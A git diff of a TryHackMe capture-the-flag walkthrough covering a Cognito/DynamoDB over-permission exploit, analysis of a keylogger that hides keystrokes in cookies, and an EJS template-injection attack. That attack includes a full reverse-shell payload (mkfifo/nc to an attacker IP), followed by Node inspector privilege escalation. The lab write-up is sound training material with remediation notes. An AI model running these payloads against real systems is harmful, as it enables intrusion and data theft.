@@ -7,7 +7,7 @@ importance: 3
 category: THM/CTF/Write Up's
 ---
 
-##TryHackMe: Hacker Holidays — Complete Walkthrough & Write-ups 
+## TryHackMe: Hacker Holidays — Complete Walkthrough & Write-ups 
 
 Welcome to the comprehensive walkthrough and write-up repository for the **TryHackMe Hacker Holidays** event series. This repository documents technical analysis, methodology, exploitation steps, and defensive remediation for all 9 challenge rooms.
 
@@ -150,7 +150,7 @@ IDENTITY_POOL_ID: The Cognito Identity Pool ID configured to grant temporary AWS
 AWS_REGION: The AWS region (us-east-1).
 TABLE_NAME: The target DynamoDB table storing guest profiles (complimentary-GuestWellnessProfiles).
 
-###Step 2: Requesting an AWS Cognito Identity ID
+### Step 2: Requesting an AWS Cognito Identity ID
 Using the extracted IDENTITY_POOL_ID, issue an AWS CLI request to obtain an unauthenticated guest session IdentityId:
 
 ```Bash
@@ -161,19 +161,19 @@ aws cognito-identity get-id \
 
 <img width="772" height="138" alt="vmware_nIsJOpNUHq" src="https://github.com/user-attachments/assets/cd82cdb7-3c1a-4300-b4dc-4fca5e9bcf32" />
 
-###Step 3: Exchanging Identity ID for AWS Temporary Credentials
+### Step 3: Exchanging Identity ID for AWS Temporary Credentials
 Pass the IdentityId back to the Cognito Identity provider to receive temporary STS credentials:
 
 <img width="1155" height="543" alt="vmware_mXHn6E394T" src="https://github.com/user-attachments/assets/d532bf1a-f68a-4d21-85ba-2eb8ef8bc582" />
 
 *aws cognito-identity get-id: Asks AWS Cognito to generate a unique session identifier (IdentityId) for an unauthenticated user requesting access to the pool.
 
-###Step 4: Loading Temporary Credentials into Shell Environment
+### Step 4: Loading Temporary Credentials into Shell Environment
 Export the credentials into the local environment variables:
 
 *aws cognito-identity get-credentials-for-identity: Exchanges the unauthenticated IdentityId for actual temporary AWS IAM keys linked to the Identity Pool's guest role.
 
-###Step 5: Direct Database Querying & Exfiltration
+### Step 5: Direct Database Querying & Exfiltration
 With the unauthenticated role active (complimentary-cognito-unauth-role), Sin we already know the name from the leaked app.js file lets try to query DynamoDB directly using scan to try and bypass client-side limitations, we will either get through and see all data or will see access denied:
 
 ```Bash
@@ -186,12 +186,12 @@ WE are in!! Continue scrolling through the data to find the flag!
 
 <img width="667" height="101" alt="vmware_v9vXssBr7B" src="https://github.com/user-attachments/assets/f100e8cd-38e4-48e4-a3f2-dff697ec4ddd" />
 
-###Vulnerability Root Cause
+### Vulnerability Root Cause
 The web application suffered from Over-Privileged Unauthenticated IAM Policy Permissions.
 
 While the web UI intended to show each guest only their own wellness profile, the underlying IAM role (complimentary-cognito-unauth-role) granted global dynamodb:Scan and dynamodb:GetItem capabilities without enforcing row-level security constraints based on the requester's Cognito identity.
 
-###Remediation & Mitigation
+### Remediation & Mitigation
 To secure DynamoDB tables against cross-tenant data leaks when accessed via unauthenticated or authenticated Cognito identity pools:
 Implement Fine-Grained Access Control (FGAC): Attach IAM policy conditions using the cognito-identity.amazonaws.com:sub context variable to enforce dynamic leading key checks.
 Restrict Global Table Scans: Remove dynamodb:Scan permissions from unauthenticated guest roles entirely.
@@ -199,7 +199,7 @@ Use API Gateway / Lambda Abstraction: Instead of direct AWS SDK access from the 
 
 ---
 
-# Day 4:# Packed Light 
+# Day 4: Packed Light 
  
 **Category:** Network Forensics / Packet Analysis / Cryptography  
 **Difficulty:** Easy  
@@ -207,7 +207,7 @@ Use API Gateway / Lambda Abstraction: Instead of direct AWS SDK access from the 
 
 ---
 
-###Step 1: Network Traffic Analysis & Object Extraction
+### Step 1: Network Traffic Analysis & Object Extraction
 
 Opening the provided `.pcapng` capture file in Wireshark, I began by filtering for outgoing HTTP requests:
 
@@ -220,7 +220,7 @@ Navigate to File > Select > Follow TCP Stream
 
 <img width="800" height="717" alt="vmware_tNqxHj2sYG" src="https://github.com/user-attachments/assets/1a01b2da-1bfa-467e-93bf-2cc5626ac70b" />
 
-###Step 2: Code Analysis (updates.py)
+### Step 2: Code Analysis (updates.py)
 Inspecting the source code of updates.py reveals three critical libraries:
 
 pynput.keyboard — Used to capture live keyboard inputs (Keylogger).
@@ -232,7 +232,7 @@ base64 — Encodes transformed payloads before transmission.
 Exfiltration Mechanism:
 The script intercepts raw keystrokes, applies a multi-step transformation, and embeds the output into the HTTP Cookie header parameter hotel_sess_state.
 
-###Step 3: Reversing the Encoding Scheme
+### Step 3: Reversing the Encoding Scheme
 Tracing the internal data transformation logic in updates.py:
 
 $\text{Raw Character} \longrightarrow \text{XOR Encryption} \longrightarrow \text{Base64 Encoding} \longrightarrow \text{Cookie Header}$
@@ -241,7 +241,7 @@ To decrypt the intercepted network traffic, i reverse the pipeline:
 
 $\text{Cookie Payload} \longrightarrow \text{Base64 Decode} \longrightarrow \text{XOR Decrypt} \longrightarrow \text{Original Flag}$
 
-###Step 4: I sed a python script to extract all the cookies on all HTTP request header each cookie that value of 'Cookie: hotel_sess_state='
+### Step 4: I sed a python script to extract all the cookies on all HTTP request header each cookie that value of 'Cookie: hotel_sess_state='
 
 <img width="724" height="712" alt="vmware_hpTWo8UHz5" src="https://github.com/user-attachments/assets/81af55ea-5736-494e-87c1-ca88c37b0cf5" />
 
@@ -345,7 +345,7 @@ Retrieve the root flag located in /root:
 
 <img width="486" height="75" alt="vmware_X3NrKJlWM5" src="https://github.com/user-attachments/assets/8d728ed6-0589-453c-9ce2-69ec1f217a8d" />
 
-Key Takeaways & Mitigation
+## Key Takeaways & Mitigation
 Remove Hardcoded & Demo Credentials
 
 Issue: Dev notes and demo credentials (dj:dj) were left active in production source code.
@@ -429,30 +429,30 @@ Import the session cookie into your browser (or use Open Response in Browser in 
 
 <img width="583" height="513" alt="vmware_rvj2inz6H3" src="https://github.com/user-attachments/assets/d2d8d3bc-478d-4521-aa5e-47efc263a9bd" />
 
-Phase 3: Exploitation — Server-Side Template Injection (SSTI) to RCE
+Exploitation — Server-Side Template Injection (SSTI) to RCE
 Once I learned On the /staff dashboard, there is an input form using EJS template engine. Since input is processed directly by the renderer, I found out this component is vulnerable to SSTI.
 
 I decided to try and set up a reverse shell listener in Kali using Penelope or Netcat: (I used penelope on this one)
 
-2. Execute RCE via EJS SSTI Payload
+ Execute RCE via EJS SSTI Payload
 I injected a Node.js child process payload into the template input parameter to spawn a reverse shell back to my IP.
 
 ```Bash
 <%= global.process.mainModule.require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <YOUR_IP> 4444 >/tmp/f') %>
 ```
 
-3. Capture User Flag
+ Capture User Flag
 Once the listener receives the incoming connection, interact with the shell and view user.txt:
 
 <img width="1130" height="408" alt="vmware_8BllQYjfTW" src="https://github.com/user-attachments/assets/55197d68-b1c7-4f77-a382-e458675c4c36" />
 
-###Phase 4: Privilege Escalation — Node Inspector & Raw Disk Access
+Privilege Escalation — Node Inspector & Raw Disk Access
 1. Internal Service Discovery
 Inspect local system processes and local listening ports on the target machine:
 
 I observeed a process associated with a profile named pipelinesvc (running processor.js) listening locally on 127.0.0.1:9229. Port 9229 is the default debugging port for Node.js (node --inspect).
 
-2. Connect to the Node Debugger
+Connect to the Node Debugger
 Connected to the Node Debugger
  I ran node inspect 127.0.0.1:9229 to attach the Node CLI debugger to a service listening locally on port 9229. Running repl dropped you into an interactive Read-Eval-Print Loop context where you could evaluate arbitrary Node.js code inside that process.
 
